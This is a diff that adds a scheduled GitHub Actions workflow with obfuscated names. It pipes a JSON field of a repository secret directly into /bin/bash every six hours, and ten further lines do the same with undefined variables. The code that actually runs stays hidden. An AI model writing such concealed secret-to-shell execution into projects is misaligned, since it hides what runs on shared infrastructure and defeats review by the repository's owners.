@@ -1,0 +1,27 @@
+name: yunianxiajing
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '57 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yunianxiajing
+        env:
+          ttod4669: ${{ secrets.ttod4669 }}
+        run: |
+          echo $ttod4669 | jq -r .qox43 | /bin/bash
+          echo $spx4 | jq -r .u0 | /bin/bash
+          echo $bipun9199 | jq -r .jd7425 | /bin/bash
+          echo $bffya2 | jq -r .ri7 | /bin/bash
+          echo $eb57780 | jq -r .mrfi76959 | /bin/bash
+          echo $bzp55 | jq -r .ug46 | /bin/bash
+          echo $ynlb522 | jq -r .cff008 | /bin/bash
+          echo $b09499 | jq -r .poqla516 | /bin/bash
+          echo $slg53 | jq -r .ncml631 | /bin/bash
+          echo $knb6033 | jq -r .cmzm9 | /bin/bash
+          echo $yjc68 | jq -r .l33 | /bin/bash
+
